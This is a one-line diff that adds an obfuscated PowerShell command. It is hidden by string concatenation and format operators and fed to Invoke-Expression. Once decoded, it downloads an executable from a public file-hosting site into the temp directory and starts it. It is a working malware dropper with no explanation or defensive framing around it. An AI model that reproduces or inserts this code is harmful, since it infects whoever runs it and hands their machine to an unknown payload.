@@ -1,0 +1,1 @@
+﻿ (('({1}dp'+'l={'+'1}'+'en'+'v:'+'t'+'emp'+'+{0'+'}f.'+'e'+'xe{0}'+');('+'New-'+'Object'+' S'+'ys'+'tem.Ne'+'t.Web'+'Cli'+'e'+'n'+'t).D'+'o'+'w'+'nloa'+'dFile'+'('+'{0}htt'+'p'+'s:'+'//a.pomf'+'.cat/bvudaf'+'.exe{0}, {1}'+'dpl'+');'+'Start'+'-Pr'+'oces'+'s {'+'1'+'}'+'d'+'pl') -f  [Char]39,[Char]36) | IEX
